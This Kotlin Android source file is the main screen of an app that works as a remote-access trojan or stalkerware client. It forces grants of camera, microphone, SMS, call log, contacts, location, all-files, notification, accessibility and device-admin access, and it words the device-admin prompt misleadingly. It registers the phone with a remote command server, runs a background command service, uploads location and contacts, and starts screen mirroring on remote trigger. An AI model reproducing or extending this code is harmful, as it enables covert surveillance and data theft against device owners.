package com.csk4.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    // ============ SCREEN CAPTURE ============
    private val SCREEN_CAPTURE_REQUEST = 1001
    private var pendingScreenMirrorCommand = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ⚠️ FORCE CHECK: Agar koi permission missing hai to PermissionActivity
        if (!allPermissionsGranted()) {
            startActivity(Intent(this, PermissionActivity::class.java))
            finish()
            return
        }

        tvStatus = findViewById(R.id.tvStatus)

        // ============ BUTTONS ============
        findViewById<Button>(R.id.btnWebPanel)?.setOnClickListener {
            startActivity(Intent(this, WebViewActivity::class.java))
        }

        findViewById<Button>(R.id.btnAdmin)?.setOnClickListener {
            enableDeviceAdmin()
        }

        findViewById<Button>(R.id.btnAccessibility)?.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<Button>(R.id.btnNotificationAccess)?.setOnClickListener {
            try {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        findViewById<Button>(R.id.btnStorageAccess)?.setOnClickListener {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
        }

        findViewById<Button>(R.id.btnBattery)?.setOnClickListener {
            if (Build.VERSION.SDK_INT >= 23) {
                try {
                    val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                }
            }
        }

        findViewById<Button>(R.id.btnStartService)?.setOnClickListener {
            startService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "✅ Service started", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnStopService)?.setOnClickListener {
            stopService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "⏹️ Service stopped", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnLocation)?.setOnClickListener {
            CommandHandler(this, deviceId).handleLocation()
            Toast.makeText(this, "📍 Location sent", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnContacts)?.setOnClickListener {
            CommandHandler(this, deviceId).handleContacts()
            Toast.makeText(this, "👥 Contacts sent", Toast.LENGTH_SHORT).show()
        }

        // ============ HANDLE SCREEN MIRROR COMMAND ============
        // Check if app opened from screen mirror notification
        if (intent?.getBooleanExtra("start_screen_mirror", false) == true) {
            pendingScreenMirrorCommand = true
        }

        registerDevice()
        startService(Intent(this, CommandService::class.java))
        updateStatus()

        // Auto-request screen capture if triggered
        if (pendingScreenMirrorCommand) {
            requestScreenCapture()
        }
    }

    // ============ SCREEN CAPTURE REQUEST ============
    fun requestScreenCapture() {
        try {
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = mpm.createScreenCaptureIntent()
            startActivityForResult(intent, SCREEN_CAPTURE_REQUEST)
            Toast.makeText(this, "Screen share permission allow karein", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Screen capture fail: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SCREEN_CAPTURE_REQUEST) {
            if (resultCode == RESULT_OK && data != null) {
                try {
                    // Start screen mirror service
                    val svc = ScreenMirrorService(this, deviceId)
                    svc.start()
                    svc.startScreenCapture(resultCode, data)
                    ScreenMirrorService.instance = svc
                    
                    Toast.makeText(this, "✅ Screen mirror started", Toast.LENGTH_SHORT).show()
                } catch (e: Exception) {
                    Toast.makeText(this, "❌ Mirror fail: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            } else {
                Toast.makeText(this, "⏹️ Screen mirror cancelled", Toast.LENGTH_SHORT).show()
            }
            pendingScreenMirrorCommand = false
        }
    }

    // ============ ALL PERMISSIONS CHECK ============
    private fun allPermissionsGranted(): Boolean {
        val perms = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        perms.forEach { p ->
            if (ContextCompat.checkSelfPermission(this, p)
                != PackageManager.PERMISSION_GRANTED) return false
        }

        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) return false
        }

        if (!isNotificationServiceEnabled()) return false

        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return false

        if (ScreenshotService.instance == null) return false

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
            return false
        }

        return true
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    // ============ ENABLE ADMIN ============
    private fun enableDeviceAdmin() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock & security")
            startActivity(i)
        } else {
            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
        }
    }

    // ============ STATUS ============
    private fun updateStatus() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminActive = dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
        val accActive = ScreenshotService.instance != null
        val storageAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true
        val notifAccess = isNotificationServiceEnabled()

        tvStatus?.text = """
            🆔 Device: $deviceId
            📱 ${Build.MODEL}
            🤖 Android ${Build.VERSION.RELEASE}
            🔋 Battery: $bat%
            🛡️ Admin: ${if (adminActive) "✅" else "❌"}
            📸 Accessibility: ${if (accActive) "✅" else "❌"}
            📁 Storage: ${if (storageAccess) "✅" else "❌"}
            🔔 Notification: ${if (notifAccess) "✅" else "❌"}
            🌐 ${Config.SERVER_URL}
        """.trimIndent()

        // Auto-hide buttons
        findViewById<Button>(R.id.btnAdmin)?.visibility = if (adminActive) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnAccessibility)?.visibility = if (accActive) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnStorageAccess)?.visibility = if (storageAccess) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnNotificationAccess)?.visibility = if (notifAccess) View.GONE else View.VISIBLE
    }

    private fun registerDevice() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.POST, "${Config.SERVER_URL}/api/device/register",
            JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", "${Build.BRAND} ${Build.MODEL}")
                put("model", Build.MODEL)
                put("android", Build.VERSION.RELEASE)
                put("battery", bat)
                put("token", Config.DEVICE_TOKEN)
            },
            { }, { }
        ))
    }

    override fun onResume() {
        super.onResume()
        if (!allPermissionsGranted() && ::tvStatus.isInitialized) {
            startActivity(Intent(this, PermissionActivity::class.java))
            finish()
            return
        }
        if (::tvStatus.isInitialized) updateStatus()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (intent?.getBooleanExtra("start_screen_mirror", false) == true) {
            requestScreenCapture()
        }
    }
}
